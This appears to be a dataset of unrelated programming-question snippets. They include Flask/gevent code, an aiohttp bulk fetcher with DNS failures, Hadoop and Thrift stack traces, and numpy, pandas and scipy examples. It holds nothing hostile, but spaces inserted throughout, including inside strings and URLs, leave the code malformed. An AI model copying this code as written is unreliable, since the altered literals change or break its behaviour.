, line 433 , in _call_chain result = func ( *args ) File `` /usr/lib/python3.4/urllib/request.py '' , line 579 , in http_error_default raise HTTPError ( req.full_url , code , msg , hdrs , fp ) urllib.error.HTTPError : HTTP Error 400 : Bad Request"
"import geventfrom flask import copy_current_request_context , g @ app.route ( '/ ' ) def index ( ) : g.user_data = 'foobar ' g.more_user_data = 'baz ' @ copy_current_request_context def do_some_work ( ) : some_func ( g.user_data , g.more_user_data ) ... gevent.spawn ( do_some_work ) return 'Regular response ' AttributeError : '_AppCtxGlobals ' object has no attribute 'user_data ' import geventfrom flask import g @ app.route ( '/ ' ) def index ( ) : g.user_data = 'foobar ' g.more_user_data = 'baz ' def do_some_work ( user_data , more_user_data ) : some_func ( user_data , more_user_data ) ... gevent.spawn ( do_some_work , g.user_data , g.more_user_data ) return 'Regular response '"
a = 1858b = 60
class MyClass : def __init__ ( self ) : run_some_long_time_function ( )
class Test ( ) : def __init__ ( self ) : pass @ property @ functools.lru_cache ( ) def prop ( self ) : # Compute some stuffs and return complex number AttributeError : 'numpy.complex128 ' object has no attribute 'cache_clear '
"a_charge = stripe.Charge.create ( amount=cents , currency= '' usd '' , source=token , description= '' my_description '' , application_fee=application_fee , stripe_account=teacher_stripe_id ) stripe.Charge.retrieve ( a_charge.id )"
"import numpy as npdtype = np.dtype ( [ ( ' a ' , np.float_ ) , ( ' b ' , np.int_ ) ] ) ar = np.array ( ( 0.5 , 1 ) , dtype=dtype ) ar [ ' a ' ] import numpy as npdtype = np.dtype ( [ ( ' a ' , np.float_ ) , ( ' b ' , np.int_ ) ] ) ar = np.array ( [ ( 0.5 , 1 ) ] , dtype=dtype ) ar [ 0 ] [ ' a ' ]"
"socket.gaierror ( 8 , 'nodename nor servname provided , or not known ' ) import asyncioimport itertoolsimport aiohttpimport aiohttp.client_exceptionsfrom yarl import URLua = itertools.cycle ( ( `` Mozilla/5.0 ( X11 ; Linux i686 ; rv:64.0 ) Gecko/20100101 Firefox/64.0 '' , `` Mozilla/5.0 ( Macintosh ; U ; Intel Mac OS X 10.10 ; rv:62.0 ) Gecko/20100101 Firefox/62.0 '' , `` Mozilla/5.0 ( Macintosh ; U ; Intel Mac OS X 10.13 ; ko ; rv:1.9.1b2 ) Gecko/20081201 Firefox/60.0 '' , `` Mozilla/5.0 ( Windows NT 6.1 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/41.0.2228.0 Safari/537.36 '' ) ) async def get ( url , session ) - > str : async with await session.request ( `` GET '' , url=url , raise_for_status=True , headers= { 'User-Agent ' : next ( ua ) } , ssl=False ) as resp : text = await resp.text ( encoding= '' utf-8 '' , errors= '' replace '' ) print ( `` Got text for URL '' , url ) return textasync def bulk_get ( urls ) - > list : async with aiohttp.ClientSession ( ) as session : htmls = await asyncio.gather ( * ( get ( url=url , session=session ) for url in urls ) , return_exceptions=True ) return htmls # See https : //gist.github.com/bsolomon1124/fc625b624dd26ad9b5c39ccb9e230f5awith open ( `` /path/to/urls.txt '' ) as f : urls = tuple ( URL ( i.strip ( ) ) for i in f ) res = asyncio.run ( bulk_get ( urls ) ) # urls : Tuple [ yarl.URL ] c = 0for i in res : if isinstance ( i , aiohttp.client_exceptions.ClientConnectorError ) : print ( i ) c += 1print ( c ) # 21205 ! ! ! ! ! ( 85 % failure rate ) print ( len ( urls ) ) # 24934 Can not connect to host sigmainvestments.com:80 ssl : False [ nodename nor servname provided , or not known ] Can not connect to host giaoducthoidai.vn:443 ssl : False [ nodename nor servname provided , or not known ] Can not connect to host chauxuannguyen.org:80 ssl : False [ nodename nor servname provided , or not known ] Can not connect to host www.baohomnay.com:443 ssl : False [ nodename nor servname provided , or not known ] Can not connect to host www.soundofhope.org:80 ssl : False [ nodename nor servname provided , or not known ] # And so on ... [ ~/ ] $ ping -c 5 www.hongkongfp.comPING www.hongkongfp.com ( 104.20.232.8 ) : 56 data bytes64 bytes from 104.20.232.8 : icmp_seq=0 ttl=56 time=11.667 ms64 bytes from 104.20.232.8 : icmp_seq=1 ttl=56 time=12.169 ms64 bytes from 104.20.232.8 : icmp_seq=2 ttl=56 time=12.135 ms64 bytes from 104.20.232.8 : icmp_seq=3 ttl=56 time=12.235 ms64 bytes from 104.20.232.8 : icmp_seq=4 ttl=56 time=14.252 ms -- - www.hongkongfp.com ping statistics -- -5 packets transmitted , 5 packets received , 0.0 % packet lossround-trip min/avg/max/stddev = 11.667/12.492/14.252/0.903 ms In [ 1 ] : import asyncio ... : from aiohttp.connector import TCPConnector ... : from clipslabapp.ratemgr import default_aiohttp_tcpconnector ... : ... : ... : async def main ( ) : ... : conn = default_aiohttp_tcpconnector ( ) ... : i = await asyncio.create_task ( conn._resolve_host ( host='www.hongkongfp.com ' , port=443 ) ) ... : return i ... : ... : i = asyncio.run ( main ( ) ) In [ 2 ] : i Out [ 2 ] : [ { 'hostname ' : 'www.hongkongfp.com ' , 'host ' : '104.20.232.8 ' , 'port ' : 443 , 'family ' : < AddressFamily.AF_INET : 2 > , 'proto ' : 6 , 'flags ' : < AddressInfo.AI_NUMERICHOST : 4 > } , { 'hostname ' : 'www.hongkongfp.com ' , 'host ' : '104.20.233.8 ' , 'port ' : 443 , 'family ' : < AddressFamily.AF_INET : 2 > , 'proto ' : 6 , 'flags ' : < AddressInfo.AI_NUMERICHOST : 4 > } ] In [ 18 ] : iOut [ 18 ] : aiohttp.client_exceptions.ClientConnectorError ( 8 , 'nodename nor servname provided , or not known ' ) In [ 19 ] : i.host , i.portOut [ 19 ] : ( 'www.hongkongfp.com ' , 443 ) In [ 20 ] : i._conn_keyOut [ 20 ] : ConnectionKey ( host='www.hongkongfp.com ' , port=443 , is_ssl=True , ssl=False , proxy=None , proxy_auth=None , proxy_headers_hash=None ) In [ 21 ] : i._os_errorOut [ 21 ] : socket.gaierror ( 8 , 'nodename nor servname provided , or not known ' ) In [ 22 ] : raise i.with_traceback ( i.__traceback__ ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -gaierror Traceback ( most recent call last ) ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/connector.py in _create_direct_connection ( self , req , traces , timeout , client_error ) 954 port , -- > 955 traces=traces ) , loop=self._loop ) 956 except OSError as exc : ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/connector.py in _resolve_host ( self , host , port , traces ) 824 addrs = await \ -- > 825 self._resolver.resolve ( host , port , family=self._family ) 826 if traces : ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/resolver.py in resolve ( self , host , port , family ) 29 infos = await self._loop.getaddrinfo ( -- - > 30 host , port , type=socket.SOCK_STREAM , family=family ) 31/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/lib/python3.7/asyncio/base_events.py in getaddrinfo ( self , host , port , family , type , proto , flags ) 772 return await self.run_in_executor ( -- > 773 None , getaddr_func , host , port , family , type , proto , flags ) 774/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/lib/python3.7/concurrent/futures/thread.py in run ( self ) 56 try : -- - > 57 result = self.fn ( *self.args , **self.kwargs ) 58 except BaseException as exc : /usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/lib/python3.7/socket.py in getaddrinfo ( host , port , family , type , proto , flags ) 747 addrlist = [ ] -- > 748 for res in _socket.getaddrinfo ( host , port , family , type , proto , flags ) : 749 af , socktype , proto , canonname , sa = resgaierror : [ Errno 8 ] nodename nor servname provided , or not knownThe above exception was the direct cause of the following exception : ClientConnectorError Traceback ( most recent call last ) < ipython-input-22-72402d8c3b31 > in < module > -- -- > 1 raise i.with_traceback ( i.__traceback__ ) < ipython-input-1-2bc0f5172de7 > in get ( url , session ) 19 raise_for_status=True , 20 headers= { 'User-Agent ' : next ( ua ) } , -- - > 21 ssl=False 22 ) as resp : 23 return await resp.text ( encoding= '' utf-8 '' , errors= '' replace '' ) ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/client.py in _request ( self , method , str_or_url , params , data , json , cookies , headers , skip_auto_headers , auth , allow_redirects , max_redirects , compress , chunked , expect100 , raise_for_status , read_until_eof , proxy , proxy_auth , timeout , verify_ssl , fingerprint , ssl_context , ssl , proxy_headers , trace_request_ctx ) 474 req , 475 traces=traces , -- > 476 timeout=real_timeout 477 ) 478 except asyncio.TimeoutError as exc : ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/connector.py in connect ( self , req , traces , timeout ) 520 521 try : -- > 522 proto = await self._create_connection ( req , traces , timeout ) 523 if self._closed : 524 proto.close ( ) ~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/connector.py in _create_connection ( self , req , traces , timeout ) 852 else : 853 _ , proto = await self._create_direct_connection ( -- > 854 req , traces , timeout ) 855 856 return proto~/Scripts/python/projects/clab/lib/python3.7/site-packages/aiohttp/connector.py in _create_direct_connection ( self , req , traces , timeout , client_error ) 957 # in case of proxy it is not ClientProxyConnectionError 958 # it is problem of resolving proxy ip itself -- > 959 raise ClientConnectorError ( req.connection_key , exc ) from exc 960 961 last_exc = None # type : Optional [ Exception ] ClientConnectorError : Can not connect to host www.hongkongfp.com:443 ssl : False [ nodename nor servname provided , or not known [ ~/ ] $ ping -c 2 75.75.75.75PING 75.75.75.75 ( 75.75.75.75 ) : 56 data bytes64 bytes from 75.75.75.75 : icmp_seq=0 ttl=57 time=16.478 ms64 bytes from 75.75.75.75 : icmp_seq=1 ttl=57 time=21.042 ms -- - 75.75.75.75 ping statistics -- -2 packets transmitted , 2 packets received , 0.0 % packet lossround-trip min/avg/max/stddev = 16.478/18.760/21.042/2.282 ms [ ~/ ] $ ping -c 2 75.75.76.76PING 75.75.76.76 ( 75.75.76.76 ) : 56 data bytes64 bytes from 75.75.76.76 : icmp_seq=0 ttl=54 time=33.904 ms64 bytes from 75.75.76.76 : icmp_seq=1 ttl=54 time=32.788 ms -- - 75.75.76.76 ping statistics -- -2 packets transmitted , 2 packets received , 0.0 % packet lossround-trip min/avg/max/stddev = 32.788/33.346/33.904/0.558 ms [ ~/ ] $ ping6 -c 2 2001:558 : feed : :1PING6 ( 56=40+8+8 bytes ) 2601:14d:8b00:7d0:6587:7cfc : e2cc:82a0 -- > 2001:558 : feed : :116 bytes from 2001:558 : feed : :1 , icmp_seq=0 hlim=57 time=14.927 ms16 bytes from 2001:558 : feed : :1 , icmp_seq=1 hlim=57 time=14.585 ms -- - 2001:558 : feed : :1 ping6 statistics -- -2 packets transmitted , 2 packets received , 0.0 % packet lossround-trip min/avg/max/std-dev = 14.585/14.756/14.927/0.171 ms [ ~/ ] $ ping6 -c 2 2001:558 : feed : :2PING6 ( 56=40+8+8 bytes ) 2601:14d:8b00:7d0:6587:7cfc : e2cc:82a0 -- > 2001:558 : feed : :216 bytes from 2001:558 : feed : :2 , icmp_seq=0 hlim=54 time=12.694 ms16 bytes from 2001:558 : feed : :2 , icmp_seq=1 hlim=54 time=11.555 ms -- - 2001:558 : feed : :2 ping6 statistics -- -2 packets transmitted , 2 packets received , 0.0 % packet lossround-trip min/avg/max/std-dev = 11.555/12.125/12.694/0.569 ms"
13/04/09 11:54:34 INFO streaming.MongoStreamJob : Running13/04/09 11:54:34 INFO streaming.MongoStreamJob : Init13/04/09 11:54:34 INFO streaming.MongoStreamJob : Process Args13/04/09 11:54:34 INFO streaming.StreamJobPatch : Setup Options'13/04/09 11:54:34 INFO streaming.StreamJobPatch : PreProcess Args13/04/09 11:54:34 INFO streaming.StreamJobPatch : Parse Options13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-mapper'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'examples/treasury/mapper.py'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-reducer'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'examples/treasury/reducer.py'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-inputformat'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'com.mongodb.hadoop.mapred.MongoInputFormat'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-outputformat'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'com.mongodb.hadoop.mapred.MongoOutputFormat'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-inputURI'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'mongodb : //127.0.0.1/mongo_hadoop.yield_historical.in'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : '-outputURI'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Arg : 'mongodb : //127.0.0.1/mongo_hadoop.yield_historical.streaming.out'13/04/09 11:54:34 INFO streaming.StreamJobPatch : Add InputSpecs13/04/09 11:54:34 INFO streaming.StreamJobPatch : Setup output_13/04/09 11:54:34 INFO streaming.StreamJobPatch : Post Process Args13/04/09 11:54:34 INFO streaming.MongoStreamJob : Args processed.13/04/09 11:54:36 INFO io.MongoIdentifierResolver : Resolving : bson13/04/09 11:54:36 INFO io.MongoIdentifierResolver : Resolving : bson13/04/09 11:54:36 INFO io.MongoIdentifierResolver : Resolving : bson13/04/09 11:54:36 INFO io.MongoIdentifierResolver : Resolving : bson**Exception in thread `` main '' java.lang.NoClassDefFoundError : org/apache/hadoop/mapreduce/filecache/DistributedCache** at org.apache.hadoop.streaming.StreamJob.setJobConf ( StreamJob.java:959 ) at com.mongodb.hadoop.streaming.MongoStreamJob.run ( MongoStreamJob.java:36 ) at org.apache.hadoop.util.ToolRunner.run ( ToolRunner.java:70 ) at org.apache.hadoop.util.ToolRunner.run ( ToolRunner.java:84 ) at com.mongodb.hadoop.streaming.MongoStreamJob.main ( MongoStreamJob.java:63 ) at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:39 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:25 ) at java.lang.reflect.Method.invoke ( Method.java:597 ) at org.apache.hadoop.util.RunJar.main ( RunJar.java:208 ) Caused by : java.lang.ClassNotFoundException : org.apache.hadoop.mapreduce.filecache.DistributedCache at java.net.URLClassLoader $ 1.run ( URLClassLoader.java:202 ) at java.security.AccessController.doPrivileged ( Native Method ) at java.net.URLClassLoader.findClass ( URLClassLoader.java:190 ) at java.lang.ClassLoader.loadClass ( ClassLoader.java:306 ) at java.lang.ClassLoader.loadClass ( ClassLoader.java:247 ) ... 10 more
> > > 0.0 is 0.0True # as expected > > > float ( 0.0 ) is 0.0True # as expected > > > float ( 0 ) is 0.0False > > > float ( 0 ) is float ( 0 ) False
"> > > a , b , c , d , e = 1 , 2 , 3 , 4 , 5 > > > f , g , h , i , j = 1 , 2 , 3 , 4 , 5 > > > [ id ( x ) == id ( y ) for x , y in zip ( [ a , b , c , d , e ] , [ f , g , h , i , j ] ) ] [ True , True , True , True , True ] > > > nines = [ ( x + y , 9 ) for x , y in enumerate ( reversed ( range ( 10 ) ) ) ] > > > [ id ( x ) == id ( y ) for x , y in nines ] [ True , True , True , True , True , True , True , True , True , True ] > > > a , b = 200 + 56 , 256 > > > id ( a ) == id ( b ) True > > > a , b = 200 + 57 , 257 > > > id ( a ) == id ( b ) False > > > [ id ( 2 * x + y ) == id ( 300 + x ) for x , y in enumerate ( reversed ( range ( 301 ) ) ) ] [ :10 ] [ True , True , True , True , True , True , True , True , True , True ]"
"< a title= '' Go to the comments page '' class= '' article__comments-counts '' href= '' http : //www.theglobeandmail.com/opinion/will-kevin-oleary-be-stopped/article33519766/comments/ '' > < span class= '' civil-comment-count '' data-site-id= '' globeandmail '' data-id= '' 33519766 '' data-language= '' en '' > 226 < /span > Comments < /a > import requests , bs4url = 'http : //www.theglobeandmail.com/opinion/will-kevin-oleary-be-stopped/article33519766/ ' r = requests.get ( ) soup = bs4.BeautifulSoup ( r.text , 'html.parser ' ) span = soup.find ( 'span ' , class_='civil-comment-count ' ) < span class= '' civil-comment-count '' data-id= '' 33519766 '' data-language= '' en '' data-site-id= '' globeandmail '' > < /span >"
"from astropy.io import fitsfrom astropy.wcs import WCSimport matplotlib.pyplot as plthdul = fits.open ( `` 4687500098271761792_med.fits '' ) [ 0 ] wcs = WCS ( hdul.header ) fig = plt.figure ( figsize= ( 12,12 ) ) fig.add_subplot ( 111 , projection=wcs ) plt.imshow ( hdul.data ) plt.imshow ( hdul.data ) import pandas as pddf=pd.read_csv ( `` 4687500098271761792_within_1000arcsec.csv '' ) ralist=df [ 'ra ' ] .tolist ( ) declist=df [ 'dec ' ] .tolist ( ) plt.scatter ( ralist , declist , marker='+ ' ) for index , each in enumerate ( ralist ) : ra , dec = wcs.all_world2pix ( [ each ] , [ declist [ index ] ] , 1 ) plt.scatter ( ra , dec , marker='+ ' , c= ' k ' ) hdul = fits.open ( `` 4687500098271761792_med.fits '' ) [ 0 ] wcs = WCS ( hdul.header ) fig = plt.figure ( figsize= ( 12,12 ) ) fig.add_subplot ( 111 , projection=wcs ) plt.imshow ( hdul.data ) for index , each in enumerate ( ralist ) : ra , dec = wcs.all_world2pix ( [ each ] , [ declist [ index ] ] , 1 ) plt.scatter ( ra , dec , marker='+ ' , c= ' k ' ) import pandas as pddf=pd.read_csv ( `` 4687500098271761792_within_1000arcsec.csv '' ) ralist=df [ 'ra ' ] .tolist ( ) declist=df [ 'dec ' ] .tolist ( ) from astropy.io import fitsfrom astropy.wcs import WCSimport matplotlib.pyplot as plthdul = fits.open ( `` 4687500098271761792_med.fits '' ) [ 0 ] wcs = WCS ( hdul.header ) fig = plt.figure ( figsize= ( 12,12 ) ) fig.add_subplot ( 111 , projection=wcs ) plt.imshow ( hdul.data ) ax = fig.gca ( ) ax.scatter ( [ 16 ] , [ -72 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16 ] , [ -72.2 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16 ] , [ -72.4 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16 ] , [ -72.6 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16 ] , [ -72.8 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16 ] , [ -73 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 15 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 15.4 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 15.8 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16.2 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 16.6 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) ax.scatter ( [ 17 ] , [ -72.5 ] , transform=ax.get_transform ( 'world ' ) ) for index , each in enumerate ( ralist ) : ax.scatter ( [ each ] , [ declist [ index ] ] , transform=ax.get_transform ( 'world ' ) , c= ' k ' , marker='+ ' ) for index , each in enumerate ( ralist ) : ax.scatter ( [ each ] , [ declist [ index ] ] , c= ' b ' , marker='+ ' ) ax.coords.grid ( True , color='green ' , ls='solid ' ) overlay = ax.get_coords_overlay ( 'icrs ' ) overlay.grid ( color='red ' , ls='dotted ' )"
"> > > l= [ 1,2,3 ] > > > l.append ( l ) > > > print ( l ) [ 1,2,3 , [ ... ] ] > > > del l [ : -1 ] > > > print ( l ) [ [ ... ] ] y=l [ : ] print ( y ) [ [ ... ] ] [ [ [ ... ] ] ]"
"+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Name | Options | Email |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 1,2,4-6 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| John | NaN | john @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Mary | 1,2 | mary @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Jane | 1,3-5 | jane @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- + + -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Name | Options | Email |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 1 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 2 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 4 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 5 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Bob | 6 | bob @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| John | NaN | john @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Mary | 1 | mary @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Mary | 2 | mary @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Jane | 1 | jane @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Jane | 3 | jane @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Jane | 4 | jane @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- +| Jane | 5 | jane @ email.com |+ -- -- -- + -- -- -- -- -+ -- -- -- -- -- -- -- -- + In [ 7 ] : aOut [ 7 ] : var1 var20 a , b , c 11 d , e , f 2In [ 55 ] : pd.concat ( [ Series ( row [ 'var2 ' ] , row [ 'var1 ' ] .split ( ' , ' ) ) for _ , row in a.iterrows ( ) ] ) .reset_index ( ) Out [ 55 ] : index 00 a 11 b 12 c 13 d 24 e 25 f 2"
from __future__ import subprocess SyntaxError : future feature subprocess is not defined
top f1 f2 f3 sub1 f1 f2 f3 sub2 f1 f2 f3 sub21 f1 f2 f3 sub3 f1 f2 f3 top f1 f2 f3 ... sub1 f1 f2 f3 ... sub2 f1 f2 f3 ... ... sub21 f1 f2 f3 ... sub3 f1 f2 f3
"org.apache.thrift.transport.TTransportException : FileTransport error : bad event size at org.apache.thrift.transport.TFileTransport.readEvent ( TFileTransport.java:327 ) at org.apache.thrift.transport.TFileTransport.read ( TFileTransport.java:468 ) at org.apache.thrift.transport.TFileTransport.readAll ( TFileTransport.java:439 ) at org.apache.thrift.protocol.TJSONProtocol $ LookaheadReader.read ( TJSONProtocol.java:263 ) at org.apache.thrift.protocol.TJSONProtocol.readJSONSyntaxChar ( TJSONProtocol.java:320 ) at org.apache.thrift.protocol.TJSONProtocol.readJSONArrayStart ( TJSONProtocol.java:784 ) at org.apache.thrift.protocol.TJSONProtocol.readMessageBegin ( TJSONProtocol.java:795 ) at org.apache.thrift.TBaseProcessor.process ( TBaseProcessor.java:27 ) at org.apache.thrift.transport.TFileProcessor.processUntil ( TFileProcessor.java:69 ) at org.apache.thrift.transport.TFileProcessor.processChunk ( TFileProcessor.java:102 ) at org.apache.thrift.transport.TFileProcessor.processChunk ( TFileProcessor.java:111 ) at org.apache.thrift.transport.TFileProcessor.processChunk ( TFileProcessor.java:118 ) at com.netflix.suro.client.SendToPyServer.startThriftServer ( SendToPyServer.java:51 ) at com.netflix.suro.client.SendToPyServer.main ( SendToPyServer.java:67 ) def __init__ ( self ) : self.outFile=open ( `` ../../ThriftFile.in '' , '' a '' ) self.transport = TTransport.TFileObjectTransport ( self.outFile ) self.protocol = TJSONProtocol.TJSONProtocol ( self.transport ) self.client = sendPyInterface.Client ( self.protocol ) self.transport.open ( ) def send ( self , routingKey , message ) : self.transport.write ( pickle.dumps ( self.client.send_send ( routingKey , message ) ) ) def configClient ( self , configurationDict ) : self.transport.write ( pickle.dumps ( self.client.send_ClientConfig ( configurationDict ) ) ) if __name__ == `` __main__ '' : SuroClient=SuroPyClient ( ) configurationDict= { `` ClientConfig.LB_TYPE '' : '' static '' , '' ClientConfig.LB_SERVER '' : '' localhost:7101 '' } SuroClient.configClient ( configurationDict ) SuroClient.send ( `` routingKey '' , `` testMessage '' ) public static void startThriftServer ( SendPyInterface.Processor processor ) { try { File input = new File ( `` src/main/java/com/netflix/suro/client/ThriftFile.in '' ) ; if ( ! input.exists ( ) ) { input.createNewFile ( ) ; } File output = new File ( `` src/main/java/com/netflix/suro/client/ThriftFile.out '' ) ; if ( ! output.exists ( ) ) { output.createNewFile ( ) ; } TFileTransport inputFileTransport = new TFileTransport ( input.getAbsolutePath ( ) , true ) ; TFileTransport outputFileTransport = new TFileTransport ( output.getAbsolutePath ( ) , false ) ; System.out.println ( input.getAbsolutePath ( ) ) ; System.out.println ( input.length ( ) ) ; inputFileTransport.open ( ) ; outputFileTransport.open ( ) ; System.out.println ( inputFileTransport.getBytesRemainingInBuffer ( ) ) ; inputFileTransport.setTailPolicy ( tailPolicy.WAIT_FOREVER ) ; System.out.println ( `` Wait ... '' ) ; System.out.println ( inputFileTransport.getBuffer ( ) ) ; TFileProcessor fProcessor = new TFileProcessor ( processor , new TJSONProtocol.Factory ( ) , inputFileTransport , outputFileTransport ) ; try { fProcessor.processChunk ( ) ; } catch ( TTransportException e ) { e.printStackTrace ( ) ; } System.out.println ( `` File Thrift service started ... '' ) ; } catch ( Exception e ) { e.printStackTrace ( ) ; }"
"mydict = { 'item1 ' : [ 1,2,3 ] , 'item2 ' : [ 10,20,30 ] } output : [ ( 1,10 ) , ( 1,20 ) , ( 1,30 ) , ( 2,10 ) , ( 2,20 ) , ( 2,30 ) , ( 3,10 ) , ( 3,20 ) , ( 3,30 ) ]"
"def func ( datapoint , k , t , s ) : return ( ( datapoint [ 0 ] *k+datapoint [ 1 ] *t ) *60*datapoint [ 2 ] ) *s [ n_votes , n_comments , hour ] import numpy as np import matplotlib.pyplot as plt from scipy.optimize import curve_fit initial_votes_list = [ 3 , 1 , 2 , 1 , 0 ] initial_comment_list = [ 0 , 3 , 0 , 1 , 64 ] final_score_list = [ 26,12,13,14,229 ] # Those lists contain data about multiple posts ; I want to predict one at a time , passing the parameters to the next . def func ( x , k , t , s ) : return ( ( x [ 0 ] *k+x [ 1 ] *t ) *60*x [ 2 ] ) *s x = np.array ( [ 3 , 0 , 1 ] ) y = np.array ( [ 26 ,0 ,2 ] ) # X = [ [ a , b , c ] for a , b , c in zip ( i_votes_list , i_comment_list , [ i for i in range ( len ( i_votes_list ) ) ] ) ] popt , pcov = curve_fit ( func , x , y ) plt.plot ( x , [ 1 , func ( x , *popt ) , 2 ] , ' g -- ' , label='fit : a= % 5.3f , b= % 5.3f , c= % 5.3f ' % tuple ( popt ) ) plt.xlabel ( 'Time ' ) plt.ylabel ( 'Score ' ) plt.legend ( ) plt.show ( ) ( votes_per_minute + n_comments ) * 60 * hour"
"total = 0counter = 0while True : score = int ( input ( 'Enter test score : ' ) ) if score == 0 : break total += score counter += 1average = total / counterprint ( 'The average is : ' , format ( average , ' , .3f ' ) )"
"from itertools import count , teeoriginal = count ( ) # just an example , can be another iterablea , b = tee ( original )"
"print `` { c1 } { name : > 14s } { c2 } { nick_name : > 14s } { planes : > 16s } '' .format ( name=name , nick_name=nick_name , planes=planes , c1=u.color [ 'yellow ' ] , c2=u.color [ 'default ' ] )"
from scipy import *from numpy import *from numpy.linalg import * # the matrix I will use to implement exp ( A ) A = mat ( ' [ 1 3 5 ; 2 5 1 ; 2 3 8 ] ' ) # identity matrixI = mat ( ' [ 1 0 0 ; 0 1 0 ; 0 0 1 ] ' ) # first step in Taylor Expansion ( n=0 ) B = I # second step in Taylor Expansion ( n=1 ) B += A # start the while loop in the 2nd stepn = 2x=0while x < 10 : C = ( A**n ) /factorial ( n ) print C print `` `` n+=1 B+= C print B x+=1print B
"from tornado import gen , httpclient , ioloopio_loop = ioloop.IOLoop.instance ( ) client = httpclient.AsyncHTTPClient ( io_loop=io_loop ) @ gen.enginedef go_for_it ( ) : while True : r = yield gen.Task ( fetch ) @ gen.enginedef fetch ( callback ) : response = yield gen.Task ( client.fetch , 'http : //localhost:8888/ ' ) callback ( response ) io_loop.add_callback ( go_for_it ) io_loop.start ( ) @ gen.enginedef go_for_it ( ) : while True : r = yield gen.Task ( client.fetch , 'http : //localhost:8888/ ' )"
"# ! /usr/bin/env python3class MyMeta ( type ) : passclass MyObject ( object , metaclass=MyMeta ) : # pylint error here pass pylint 1.4.3 , astroid 1.3.6 , common 0.63.2Python 3.4.2 ( default , Oct 8 2014 , 10:45:20 ) [ GCC 4.9.1 ]"
fs = [ lambda x : x + i for i in xrange ( 10 ) ] [ f ( 0 ) for f in fs ]
import profileprofile.run ( 'main ( ) ' )
"lst = [ 1,2,3,4 ] ind = 1lst [ : ind-1 : -1 ] [ 4 , 3 , 2 ] ind = 0lst [ : ind-1 : -1 ] [ ]"
